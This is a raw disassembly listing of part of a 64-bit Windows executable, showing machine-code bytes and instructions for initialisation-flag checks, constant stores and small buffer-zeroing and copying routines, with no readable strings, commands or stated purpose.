   140008057:	c6 05 16 83 2b 00 01 	movb   $0x1,0x2b8316(%rip)        # 0x1402c0374
   14000805e:	66 0f 6f 05 8a 39 00 	movdqa 0x398a(%rip),%xmm0        # 0x14000b9f0
   140008065:	00 
   140008066:	66 0f 7f 05 f2 82 2b 	movdqa %xmm0,0x2b82f2(%rip)        # 0x1402c0360
   14000806d:	00 
   14000806e:	c7 05 f8 82 2b 00 c5 	movl   $0x5d00c5,0x2b82f8(%rip)        # 0x1402c0370
   140008075:	00 5d 00 
   140008078:	48 8d 0d e1 b7 ff ff 	lea    -0x481f(%rip),%rcx        # 0x140003860
   14000807f:	e8 ec 92 ff ff       	call   0x140001370
   140008084:	c6 05 f0 81 2b 00 01 	movb   $0x1,0x2b81f0(%rip)        # 0x1402c027b
   14000808b:	80 3d e2 82 2b 00 00 	cmpb   $0x0,0x2b82e2(%rip)        # 0x1402c0374
   140008092:	0f 85 e6 de ff ff    	jne    0x140005f7e
   140008098:	e9 28 df ff ff       	jmp    0x140005fc5
   14000809d:	c6 05 ce 9c 2b 00 01 	movb   $0x1,0x2b9cce(%rip)        # 0x1402c1d72
   1400080a4:	48 b8 97 00 7a 00 7a 	movabs $0x97007a007a0097,%rax
   1400080ab:	00 97 00 
   1400080ae:	48 89 05 b3 9c 2b 00 	mov    %rax,0x2b9cb3(%rip)        # 0x1402c1d68
   1400080b5:	66 c7 05 b2 9c 2b 00 	movw   $0x3b,0x2b9cb2(%rip)        # 0x1402c1d70
   1400080bc:	3b 00 
   1400080be:	48 8d 0d db b7 ff ff 	lea    -0x4825(%rip),%rcx        # 0x1400038a0
   1400080c5:	e8 a6 92 ff ff       	call   0x140001370
   1400080ca:	c6 05 e4 81 2b 00 01 	movb   $0x1,0x2b81e4(%rip)        # 0x1402c02b5
   1400080d1:	80 3d 9a 9c 2b 00 00 	cmpb   $0x0,0x2b9c9a(%rip)        # 0x1402c1d72
   1400080d8:	0f 85 6d e1 ff ff    	jne    0x14000624b
   1400080de:	e9 a4 e1 ff ff       	jmp    0x140006287
   1400080e3:	48 8d 0d 3a 42 00 00 	lea    0x423a(%rip),%rcx        # 0x14000c324
   1400080ea:	e8 b1 16 00 00       	call   0x1400097a0
   1400080ef:	48 8d 0d 7a 17 00 00 	lea    0x177a(%rip),%rcx        # 0x140009870
   1400080f6:	e8 75 92 ff ff       	call   0x140001370
   1400080fb:	c6 05 a4 81 2b 00 01 	movb   $0x1,0x2b81a4(%rip)        # 0x1402c02a6
   140008102:	80 3d b9 8c 2b 00 00 	cmpb   $0x0,0x2b8cb9(%rip)        # 0x1402c0dc2
   140008109:	0f 85 84 e3 ff ff    	jne    0x140006493
   14000810f:	e9 d5 e3 ff ff       	jmp    0x1400064e9
   140008114:	48 8d 0d 2b 42 00 00 	lea    0x422b(%rip),%rcx        # 0x14000c346
   14000811b:	e8 70 17 00 00       	call   0x140009890
   140008120:	48 8d 0d 59 18 00 00 	lea    0x1859(%rip),%rcx        # 0x140009980
   140008127:	e8 44 92 ff ff       	call   0x140001370
   14000812c:	c6 05 74 81 2b 00 01 	movb   $0x1,0x2b8174(%rip)        # 0x1402c02a7
   140008133:	80 3d be 8c 2b 00 00 	cmpb   $0x0,0x2b8cbe(%rip)        # 0x1402c0df8
   14000813a:	0f 85 dc e3 ff ff    	jne    0x14000651c
   140008140:	e9 3a e4 ff ff       	jmp    0x14000657f
   140008145:	48 8d 0d 22 42 00 00 	lea    0x4222(%rip),%rcx        # 0x14000c36e
   14000814c:	e8 4f 18 00 00       	call   0x1400099a0
   140008151:	48 8d 0d c8 19 00 00 	lea    0x19c8(%rip),%rcx        # 0x140009b20
   140008158:	e8 13 92 ff ff       	call   0x140001370
   14000815d:	c6 05 44 81 2b 00 01 	movb   $0x1,0x2b8144(%rip)        # 0x1402c02a8
   140008164:	80 3d d9 8c 2b 00 00 	cmpb   $0x0,0x2b8cd9(%rip)        # 0x1402c0e44
   14000816b:	0f 85 4a e4 ff ff    	jne    0x1400065bb
   140008171:	e9 df e4 ff ff       	jmp    0x140006655
   140008176:	c6 05 d7 8c 2b 00 01 	movb   $0x1,0x2b8cd7(%rip)        # 0x1402c0e54
   14000817d:	48 b8 bb 00 ac 00 b4 	movabs $0xb700b400ac00bb,%rax
   140008184:	00 b7 00 
   140008187:	48 89 05 ba 8c 2b 00 	mov    %rax,0x2b8cba(%rip)        # 0x1402c0e48
   14000818e:	c7 05 b8 8c 2b 00 a4 	movl   $0x6700a4,0x2b8cb8(%rip)        # 0x1402c0e50
   140008195:	00 67 00 
   140008198:	48 8d 0d b1 19 00 00 	lea    0x19b1(%rip),%rcx        # 0x140009b50
   14000819f:	e8 cc 91 ff ff       	call   0x140001370
   1400081a4:	c6 05 fe 80 2b 00 01 	movb   $0x1,0x2b80fe(%rip)        # 0x1402c02a9
   1400081ab:	80 3d a2 8c 2b 00 00 	cmpb   $0x0,0x2b8ca2(%rip)        # 0x1402c0e54
   1400081b2:	0f 85 db e5 ff ff    	jne    0x140006793
   1400081b8:	e9 1d e6 ff ff       	jmp    0x1400067da
   1400081bd:	48 8d 0d ee 41 00 00 	lea    0x41ee(%rip),%rcx        # 0x14000c3b2
   1400081c4:	e8 a7 19 00 00       	call   0x140009b70
   1400081c9:	48 8d 0d 70 1a 00 00 	lea    0x1a70(%rip),%rcx        # 0x140009c40
   1400081d0:	e8 9b 91 ff ff       	call   0x140001370
   1400081d5:	c6 05 ce 80 2b 00 01 	movb   $0x1,0x2b80ce(%rip)        # 0x1402c02aa
   1400081dc:	80 3d a1 8c 2b 00 00 	cmpb   $0x0,0x2b8ca1(%rip)        # 0x1402c0e84
   1400081e3:	0f 85 4d e7 ff ff    	jne    0x140006936
   1400081e9:	e9 ab e7 ff ff       	jmp    0x140006999
   1400081ee:	c6 05 b3 8c 2b 00 01 	movb   $0x1,0x2b8cb3(%rip)        # 0x1402c0ea8
   1400081f5:	66 0f 6f 05 c3 38 00 	movdqa 0x38c3(%rip),%xmm0        # 0x14000bac0
   1400081fc:	00 
   1400081fd:	66 0f 7f 05 8b 8c 2b 	movdqa %xmm0,0x2b8c8b(%rip)        # 0x1402c0e90
   140008204:	00 
   140008205:	48 b8 ae 00 b3 00 9c 	movabs $0x5f009c00b300ae,%rax
   14000820c:	00 5f 00 
   14000820f:	48 89 05 8a 8c 2b 00 	mov    %rax,0x2b8c8a(%rip)        # 0x1402c0ea0
   140008216:	48 8d 0d 43 1a 00 00 	lea    0x1a43(%rip),%rcx        # 0x140009c60
   14000821d:	e8 4e 91 ff ff       	call   0x140001370
   140008222:	c6 05 82 80 2b 00 01 	movb   $0x1,0x2b8082(%rip)        # 0x1402c02ab
   140008229:	80 3d 78 8c 2b 00 00 	cmpb   $0x0,0x2b8c78(%rip)        # 0x1402c0ea8
   140008230:	0f 85 2a e8 ff ff    	jne    0x140006a60
   140008236:	e9 6c e8 ff ff       	jmp    0x140006aa7
   14000823b:	c6 05 86 8c 2b 00 01 	movb   $0x1,0x2b8c86(%rip)        # 0x1402c0ec8
   140008242:	66 0f 6f 05 a6 38 00 	movdqa 0x38a6(%rip),%xmm0        # 0x14000baf0
   140008249:	00 
   14000824a:	66 0f 7f 05 5e 8c 2b 	movdqa %xmm0,0x2b8c5e(%rip)        # 0x1402c0eb0
   140008251:	00 
   140008252:	48 b8 e8 00 fb 00 e8 	movabs $0x8300e800fb00e8,%rax
   140008259:	00 83 00 
   14000825c:	48 89 05 5d 8c 2b 00 	mov    %rax,0x2b8c5d(%rip)        # 0x1402c0ec0
   140008263:	48 8d 0d 16 1a 00 00 	lea    0x1a16(%rip),%rcx        # 0x140009c80
   14000826a:	e8 01 91 ff ff       	call   0x140001370
   14000826f:	c6 05 36 80 2b 00 01 	movb   $0x1,0x2b8036(%rip)        # 0x1402c02ac
   140008276:	80 3d 4b 8c 2b 00 00 	cmpb   $0x0,0x2b8c4b(%rip)        # 0x1402c0ec8
   14000827d:	0f 85 b7 e8 ff ff    	jne    0x140006b3a
   140008283:	e9 f9 e8 ff ff       	jmp    0x140006b81
   140008288:	48 8d 0d 47 41 00 00 	lea    0x4147(%rip),%rcx        # 0x14000c3d6
   14000828f:	e8 0c 1a 00 00       	call   0x140009ca0
   140008294:	48 8d 0d 95 1b 00 00 	lea    0x1b95(%rip),%rcx        # 0x140009e30
   14000829b:	e8 d0 90 ff ff       	call   0x140001370
   1400082a0:	c6 05 06 80 2b 00 01 	movb   $0x1,0x2b8006(%rip)        # 0x1402c02ad
   1400082a7:	80 3d 68 8c 2b 00 00 	cmpb   $0x0,0x2b8c68(%rip)        # 0x1402c0f16
   1400082ae:	0f 85 0f e9 ff ff    	jne    0x140006bc3
   1400082b4:	e9 bb e9 ff ff       	jmp    0x140006c74
   1400082b9:	c6 05 76 8c 2b 00 01 	movb   $0x1,0x2b8c76(%rip)        # 0x1402c0f36
   1400082c0:	66 0f 6f 05 68 38 00 	movdqa 0x3868(%rip),%xmm0        # 0x14000bb30
   1400082c7:	00 
   1400082c8:	66 0f 7f 05 50 8c 2b 	movdqa %xmm0,0x2b8c50(%rip)        # 0x1402c0f20
   1400082cf:	00 
   1400082d0:	c7 05 56 8c 2b 00 c1 	movl   $0xae00c1,0x2b8c56(%rip)        # 0x1402c0f30
   1400082d7:	00 ae 00 
   1400082da:	66 c7 05 51 8c 2b 00 	movw   $0x49,0x2b8c51(%rip)        # 0x1402c0f34
   1400082e1:	49 00 
   1400082e3:	48 8d 0d 76 1b 00 00 	lea    0x1b76(%rip),%rcx        # 0x140009e60
   1400082ea:	e8 81 90 ff ff       	call   0x140001370
   1400082ef:	c6 05 b8 7f 2b 00 01 	movb   $0x1,0x2b7fb8(%rip)        # 0x1402c02ae
   1400082f6:	80 3d 39 8c 2b 00 00 	cmpb   $0x0,0x2b8c39(%rip)        # 0x1402c0f36
   1400082fd:	0f 85 87 e9 ff ff    	jne    0x140006c8a
   140008303:	e9 de e9 ff ff       	jmp    0x140006ce6
   140008308:	c6 05 7d 95 2b 00 01 	movb   $0x1,0x2b957d(%rip)        # 0x1402c188c
   14000830f:	48 8d 0d 22 8c 2b 00 	lea    0x2b8c22(%rip),%rcx        # 0x1402c0f38
   140008316:	48 8d 15 ff 40 00 00 	lea    0x40ff(%rip),%rdx        # 0x14000c41c
   14000831d:	41 b8 54 09 00 00    	mov    $0x954,%r8d
   140008323:	e8 98 22 00 00       	call   0x14000a5c0
   140008328:	48 8d 0d 51 1b 00 00 	lea    0x1b51(%rip),%rcx        # 0x140009e80
   14000832f:	e8 3c 90 ff ff       	call   0x140001370
   140008334:	c6 05 74 7f 2b 00 01 	movb   $0x1,0x2b7f74(%rip)        # 0x1402c02af
   14000833b:	80 3d 4a 95 2b 00 00 	cmpb   $0x0,0x2b954a(%rip)        # 0x1402c188c
   140008342:	0f 85 b8 e9 ff ff    	jne    0x140006d00
   140008348:	e9 10 eb ff ff       	jmp    0x140006e5d
   14000834d:	c6 05 54 95 2b 00 01 	movb   $0x1,0x2b9554(%rip)        # 0x1402c18a8
   140008354:	66 0f 6f 05 94 37 00 	movdqa 0x3794(%rip),%xmm0        # 0x14000baf0
   14000835b:	00 
   14000835c:	66 0f 7f 05 2c 95 2b 	movdqa %xmm0,0x2b952c(%rip)        # 0x1402c1890
   140008363:	00 
   140008364:	48 b8 e8 00 fb 00 e8 	movabs $0x8300e800fb00e8,%rax
   14000836b:	00 83 00 
   14000836e:	48 89 05 2b 95 2b 00 	mov    %rax,0x2b952b(%rip)        # 0x1402c18a0
   140008375:	48 8d 0d 24 1b 00 00 	lea    0x1b24(%rip),%rcx        # 0x140009ea0
   14000837c:	e8 ef 8f ff ff       	call   0x140001370
   140008381:	c6 05 28 7f 2b 00 01 	movb   $0x1,0x2b7f28(%rip)        # 0x1402c02b0
   140008388:	80 3d 19 95 2b 00 00 	cmpb   $0x0,0x2b9519(%rip)        # 0x1402c18a8
   14000838f:	0f 85 14 ec ff ff    	jne    0x140006fa9
   140008395:	e9 56 ec ff ff       	jmp    0x140006ff0
   14000839a:	48 8d 0d cf 49 00 00 	lea    0x49cf(%rip),%rcx        # 0x14000cd70
   1400083a1:	e8 1a 1b 00 00       	call   0x140009ec0
   1400083a6:	48 8d 0d a3 1c 00 00 	lea    0x1ca3(%rip),%rcx        # 0x14000a050
   1400083ad:	e8 be 8f ff ff       	call   0x140001370
   1400083b2:	c6 05 f8 7e 2b 00 01 	movb   $0x1,0x2b7ef8(%rip)        # 0x1402c02b1
   1400083b9:	80 3d 36 95 2b 00 00 	cmpb   $0x0,0x2b9536(%rip)        # 0x1402c18f6
   1400083c0:	0f 85 6c ec ff ff    	jne    0x140007032
   1400083c6:	e9 18 ed ff ff       	jmp    0x1400070e3
   1400083cb:	c6 05 44 95 2b 00 01 	movb   $0x1,0x2b9544(%rip)        # 0x1402c1916
   1400083d2:	66 0f 6f 05 86 37 00 	movdqa 0x3786(%rip),%xmm0        # 0x14000bb60
   1400083d9:	00 
   1400083da:	66 0f 7f 05 1e 95 2b 	movdqa %xmm0,0x2b951e(%rip)        # 0x1402c1900
   1400083e1:	00 
   1400083e2:	c7 05 24 95 2b 00 db 	movl   $0xc800db,0x2b9524(%rip)        # 0x1402c1910
   1400083e9:	00 c8 00 
   1400083ec:	66 c7 05 1f 95 2b 00 	movw   $0x63,0x2b951f(%rip)        # 0x1402c1914
   1400083f3:	63 00 
   1400083f5:	48 8d 0d 84 1c 00 00 	lea    0x1c84(%rip),%rcx        # 0x14000a080
   1400083fc:	e8 6f 8f ff ff       	call   0x140001370
   140008401:	c6 05 aa 7e 2b 00 01 	movb   $0x1,0x2b7eaa(%rip)        # 0x1402c02b2
   140008408:	80 3d 07 95 2b 00 00 	cmpb   $0x0,0x2b9507(%rip)        # 0x1402c1916
   14000840f:	0f 85 e4 ec ff ff    	jne    0x1400070f9
   140008415:	e9 3b ed ff ff       	jmp    0x140007155
   14000841a:	c6 05 1b 99 2b 00 01 	movb   $0x1,0x2b991b(%rip)        # 0x1402c1d3c
   140008421:	48 8d 0d f0 94 2b 00 	lea    0x2b94f0(%rip),%rcx        # 0x1402c1918
   140008428:	48 8d 15 87 49 00 00 	lea    0x4987(%rip),%rdx        # 0x14000cdb6
   14000842f:	41 b8 24 04 00 00    	mov    $0x424,%r8d
   140008435:	e8 86 21 00 00       	call   0x14000a5c0
   14000843a:	48 8d 0d 5f 1c 00 00 	lea    0x1c5f(%rip),%rcx        # 0x14000a0a0
   140008441:	e8 2a 8f ff ff       	call   0x140001370
   140008446:	c6 05 66 7e 2b 00 01 	movb   $0x1,0x2b7e66(%rip)        # 0x1402c02b3
   14000844d:	80 3d e8 98 2b 00 00 	cmpb   $0x0,0x2b98e8(%rip)        # 0x1402c1d3c
   140008454:	0f 85 15 ed ff ff    	jne    0x14000716f
   14000845a:	e9 c0 ed ff ff       	jmp    0x14000721f
   14000845f:	c6 05 1e 7f 2b 00 01 	movb   $0x1,0x2b7f1e(%rip)        # 0x1402c0384
   140008466:	48 b8 a6 00 c7 00 b4 	movabs $0xc500b400c700a6,%rax
   14000846d:	00 c5 00 
   140008470:	48 89 05 01 7f 2b 00 	mov    %rax,0x2b7f01(%rip)        # 0x1402c0378
   140008477:	c7 05 ff 7e 2b 00 c7 	movl   $0x5300c7,0x2b7eff(%rip)        # 0x1402c0380
   14000847e:	00 53 00 
   140008481:	48 8d 0d f8 b3 ff ff 	lea    -0x4c08(%rip),%rcx        # 0x140003880
   140008488:	e8 e3 8e ff ff       	call   0x140001370
   14000848d:	c6 05 e8 7d 2b 00 01 	movb   $0x1,0x2b7de8(%rip)        # 0x1402c027c
   140008494:	80 3d e9 7e 2b 00 00 	cmpb   $0x0,0x2b7ee9(%rip)        # 0x1402c0384
   14000849b:	0f 85 a6 e3 ff ff    	jne    0x140006847
   1400084a1:	e9 e8 e3 ff ff       	jmp    0x14000688e
   1400084a6:	48 8b 8d 28 17 00 00 	mov    0x1728(%rbp),%rcx
   1400084ad:	e8 ac 8f ff ff       	call   0x14000145e
   1400084b2:	cc                   	int3
   1400084b3:	cc                   	int3
   1400084b4:	cc                   	int3
   1400084b5:	cc                   	int3
   1400084b6:	cc                   	int3
   1400084b7:	cc                   	int3
   1400084b8:	cc                   	int3
   1400084b9:	cc                   	int3
   1400084ba:	cc                   	int3
   1400084bb:	cc                   	int3
   1400084bc:	cc                   	int3
   1400084bd:	cc                   	int3
   1400084be:	cc                   	int3
   1400084bf:	cc                   	int3
   1400084c0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400084c3:	0f 29 05 46 7f 2b 00 	movaps %xmm0,0x2b7f46(%rip)        # 0x1402c0410
   1400084ca:	0f 29 05 2f 7f 2b 00 	movaps %xmm0,0x2b7f2f(%rip)        # 0x1402c0400
   1400084d1:	0f 29 05 18 7f 2b 00 	movaps %xmm0,0x2b7f18(%rip)        # 0x1402c03f0
   1400084d8:	0f 29 05 01 7f 2b 00 	movaps %xmm0,0x2b7f01(%rip)        # 0x1402c03e0
   1400084df:	0f 29 05 ea 7e 2b 00 	movaps %xmm0,0x2b7eea(%rip)        # 0x1402c03d0
   1400084e6:	48 c7 05 2d 7f 2b 00 	movq   $0x0,0x2b7f2d(%rip)        # 0x1402c041e
   1400084ed:	00 00 00 00 
   1400084f1:	c3                   	ret
   1400084f2:	cc                   	int3
   1400084f3:	cc                   	int3
   1400084f4:	cc                   	int3
   1400084f5:	cc                   	int3
   1400084f6:	cc                   	int3
   1400084f7:	cc                   	int3
   1400084f8:	cc                   	int3
   1400084f9:	cc                   	int3
   1400084fa:	cc                   	int3
   1400084fb:	cc                   	int3
   1400084fc:	cc                   	int3
   1400084fd:	cc                   	int3
   1400084fe:	cc                   	int3
   1400084ff:	cc                   	int3
   140008500:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008503:	0f 29 05 26 7f 2b 00 	movaps %xmm0,0x2b7f26(%rip)        # 0x1402c0430
   14000850a:	48 c7 05 2b 7f 2b 00 	movq   $0x0,0x2b7f2b(%rip)        # 0x1402c0440
   140008511:	00 00 00 00 
   140008515:	c3                   	ret
   140008516:	cc                   	int3
   140008517:	cc                   	int3
   140008518:	cc                   	int3
   140008519:	cc                   	int3
   14000851a:	cc                   	int3
   14000851b:	cc                   	int3
   14000851c:	cc                   	int3
   14000851d:	cc                   	int3
   14000851e:	cc                   	int3
   14000851f:	cc                   	int3
   140008520:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008523:	0f 29 05 26 7f 2b 00 	movaps %xmm0,0x2b7f26(%rip)        # 0x1402c0450
   14000852a:	c7 05 2c 7f 2b 00 00 	movl   $0x0,0x2b7f2c(%rip)        # 0x1402c0460
   140008531:	00 00 00 
   140008534:	c3                   	ret
   140008535:	cc                   	int3
   140008536:	cc                   	int3
   140008537:	cc                   	int3
   140008538:	cc                   	int3
   140008539:	cc                   	int3
   14000853a:	cc                   	int3
   14000853b:	cc                   	int3
   14000853c:	cc                   	int3
   14000853d:	cc                   	int3
   14000853e:	cc                   	int3
   14000853f:	cc                   	int3
   140008540:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008543:	0f 11 05 64 7f 2b 00 	movups %xmm0,0x2b7f64(%rip)        # 0x1402c04ae
   14000854a:	0f 29 05 4f 7f 2b 00 	movaps %xmm0,0x2b7f4f(%rip)        # 0x1402c04a0
   140008551:	0f 29 05 38 7f 2b 00 	movaps %xmm0,0x2b7f38(%rip)        # 0x1402c0490
   140008558:	0f 29 05 21 7f 2b 00 	movaps %xmm0,0x2b7f21(%rip)        # 0x1402c0480
   14000855f:	0f 29 05 0a 7f 2b 00 	movaps %xmm0,0x2b7f0a(%rip)        # 0x1402c0470
   140008566:	c3                   	ret
   140008567:	cc                   	int3
   140008568:	cc                   	int3
   140008569:	cc                   	int3
   14000856a:	cc                   	int3
   14000856b:	cc                   	int3
   14000856c:	cc                   	int3
   14000856d:	cc                   	int3
   14000856e:	cc                   	int3
   14000856f:	cc                   	int3
   140008570:	c6 05 8d 7f 2b 00 01 	movb   $0x1,0x2b7f8d(%rip)        # 0x1402c0504
   140008577:	0f b7 01             	movzwl (%rcx),%eax
   14000857a:	66 89 05 3f 7f 2b 00 	mov    %ax,0x2b7f3f(%rip)        # 0x1402c04c0
   140008581:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008585:	66 89 05 36 7f 2b 00 	mov    %ax,0x2b7f36(%rip)        # 0x1402c04c2
   14000858c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008590:	66 89 05 2d 7f 2b 00 	mov    %ax,0x2b7f2d(%rip)        # 0x1402c04c4
   140008597:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000859b:	66 89 05 24 7f 2b 00 	mov    %ax,0x2b7f24(%rip)        # 0x1402c04c6
   1400085a2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400085a6:	66 89 05 1b 7f 2b 00 	mov    %ax,0x2b7f1b(%rip)        # 0x1402c04c8
   1400085ad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400085b1:	66 89 05 12 7f 2b 00 	mov    %ax,0x2b7f12(%rip)        # 0x1402c04ca
   1400085b8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400085bc:	66 89 05 09 7f 2b 00 	mov    %ax,0x2b7f09(%rip)        # 0x1402c04cc
   1400085c3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400085c7:	66 89 05 00 7f 2b 00 	mov    %ax,0x2b7f00(%rip)        # 0x1402c04ce
   1400085ce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400085d2:	66 89 05 f7 7e 2b 00 	mov    %ax,0x2b7ef7(%rip)        # 0x1402c04d0
   1400085d9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400085dd:	66 89 05 ee 7e 2b 00 	mov    %ax,0x2b7eee(%rip)        # 0x1402c04d2
   1400085e4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400085e8:	66 89 05 e5 7e 2b 00 	mov    %ax,0x2b7ee5(%rip)        # 0x1402c04d4
   1400085ef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400085f3:	66 89 05 dc 7e 2b 00 	mov    %ax,0x2b7edc(%rip)        # 0x1402c04d6
   1400085fa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400085fe:	66 89 05 d3 7e 2b 00 	mov    %ax,0x2b7ed3(%rip)        # 0x1402c04d8
   140008605:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008609:	66 89 05 ca 7e 2b 00 	mov    %ax,0x2b7eca(%rip)        # 0x1402c04da
   140008610:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008614:	66 89 05 c1 7e 2b 00 	mov    %ax,0x2b7ec1(%rip)        # 0x1402c04dc
   14000861b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000861f:	66 89 05 b8 7e 2b 00 	mov    %ax,0x2b7eb8(%rip)        # 0x1402c04de
   140008626:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000862a:	66 89 05 af 7e 2b 00 	mov    %ax,0x2b7eaf(%rip)        # 0x1402c04e0
   140008631:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008635:	66 89 05 a6 7e 2b 00 	mov    %ax,0x2b7ea6(%rip)        # 0x1402c04e2
   14000863c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008640:	66 89 05 9d 7e 2b 00 	mov    %ax,0x2b7e9d(%rip)        # 0x1402c04e4
   140008647:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000864b:	66 89 05 94 7e 2b 00 	mov    %ax,0x2b7e94(%rip)        # 0x1402c04e6
   140008652:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008656:	66 89 05 8b 7e 2b 00 	mov    %ax,0x2b7e8b(%rip)        # 0x1402c04e8
   14000865d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008661:	66 89 05 82 7e 2b 00 	mov    %ax,0x2b7e82(%rip)        # 0x1402c04ea
   140008668:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   14000866c:	66 89 05 79 7e 2b 00 	mov    %ax,0x2b7e79(%rip)        # 0x1402c04ec
   140008673:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008677:	66 89 05 70 7e 2b 00 	mov    %ax,0x2b7e70(%rip)        # 0x1402c04ee
   14000867e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008682:	66 89 05 67 7e 2b 00 	mov    %ax,0x2b7e67(%rip)        # 0x1402c04f0
   140008689:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   14000868d:	66 89 05 5e 7e 2b 00 	mov    %ax,0x2b7e5e(%rip)        # 0x1402c04f2
   140008694:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008698:	66 89 05 55 7e 2b 00 	mov    %ax,0x2b7e55(%rip)        # 0x1402c04f4
   14000869f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400086a3:	66 89 05 4c 7e 2b 00 	mov    %ax,0x2b7e4c(%rip)        # 0x1402c04f6
   1400086aa:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   1400086ae:	66 89 05 43 7e 2b 00 	mov    %ax,0x2b7e43(%rip)        # 0x1402c04f8
   1400086b5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   1400086b9:	66 89 05 3a 7e 2b 00 	mov    %ax,0x2b7e3a(%rip)        # 0x1402c04fa
   1400086c0:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   1400086c4:	66 89 05 31 7e 2b 00 	mov    %ax,0x2b7e31(%rip)        # 0x1402c04fc
   1400086cb:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   1400086cf:	66 89 05 28 7e 2b 00 	mov    %ax,0x2b7e28(%rip)        # 0x1402c04fe
   1400086d6:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   1400086da:	66 89 05 1f 7e 2b 00 	mov    %ax,0x2b7e1f(%rip)        # 0x1402c0500
   1400086e1:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   1400086e5:	66 89 05 16 7e 2b 00 	mov    %ax,0x2b7e16(%rip)        # 0x1402c0502
   1400086ec:	c3                   	ret
   1400086ed:	cc                   	int3
   1400086ee:	cc                   	int3
   1400086ef:	cc                   	int3
   1400086f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400086f3:	0f 29 05 f6 7d 2b 00 	movaps %xmm0,0x2b7df6(%rip)        # 0x1402c04f0
   1400086fa:	0f 29 05 df 7d 2b 00 	movaps %xmm0,0x2b7ddf(%rip)        # 0x1402c04e0
   140008701:	0f 29 05 c8 7d 2b 00 	movaps %xmm0,0x2b7dc8(%rip)        # 0x1402c04d0
   140008708:	0f 29 05 b1 7d 2b 00 	movaps %xmm0,0x2b7db1(%rip)        # 0x1402c04c0
   14000870f:	c7 05 e7 7d 2b 00 00 	movl   $0x0,0x2b7de7(%rip)        # 0x1402c0500
   140008716:	00 00 00 
   140008719:	c3                   	ret
   14000871a:	cc                   	int3
   14000871b:	cc                   	int3
   14000871c:	cc                   	int3
   14000871d:	cc                   	int3
   14000871e:	cc                   	int3
   14000871f:	cc                   	int3
   140008720:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008723:	0f 11 05 f0 7d 2b 00 	movups %xmm0,0x2b7df0(%rip)        # 0x1402c051a
   14000872a:	0f 29 05 df 7d 2b 00 	movaps %xmm0,0x2b7ddf(%rip)        # 0x1402c0510
   140008731:	c3                   	ret
   140008732:	cc                   	int3
   140008733:	cc                   	int3
   140008734:	cc                   	int3
   140008735:	cc                   	int3
   140008736:	cc                   	int3
   140008737:	cc                   	int3
   140008738:	cc                   	int3
   140008739:	cc                   	int3
   14000873a:	cc                   	int3
   14000873b:	cc                   	int3
   14000873c:	cc                   	int3
   14000873d:	cc                   	int3
   14000873e:	cc                   	int3
   14000873f:	cc                   	int3
   140008740:	c6 05 27 7e 2b 00 01 	movb   $0x1,0x2b7e27(%rip)        # 0x1402c056e
   140008747:	0f b7 01             	movzwl (%rcx),%eax
   14000874a:	66 89 05 df 7d 2b 00 	mov    %ax,0x2b7ddf(%rip)        # 0x1402c0530
   140008751:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008755:	66 89 05 d6 7d 2b 00 	mov    %ax,0x2b7dd6(%rip)        # 0x1402c0532
   14000875c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008760:	66 89 05 cd 7d 2b 00 	mov    %ax,0x2b7dcd(%rip)        # 0x1402c0534
   140008767:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000876b:	66 89 05 c4 7d 2b 00 	mov    %ax,0x2b7dc4(%rip)        # 0x1402c0536
   140008772:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008776:	66 89 05 bb 7d 2b 00 	mov    %ax,0x2b7dbb(%rip)        # 0x1402c0538
   14000877d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008781:	66 89 05 b2 7d 2b 00 	mov    %ax,0x2b7db2(%rip)        # 0x1402c053a
   140008788:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000878c:	66 89 05 a9 7d 2b 00 	mov    %ax,0x2b7da9(%rip)        # 0x1402c053c
   140008793:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008797:	66 89 05 a0 7d 2b 00 	mov    %ax,0x2b7da0(%rip)        # 0x1402c053e
   14000879e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400087a2:	66 89 05 97 7d 2b 00 	mov    %ax,0x2b7d97(%rip)        # 0x1402c0540
   1400087a9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
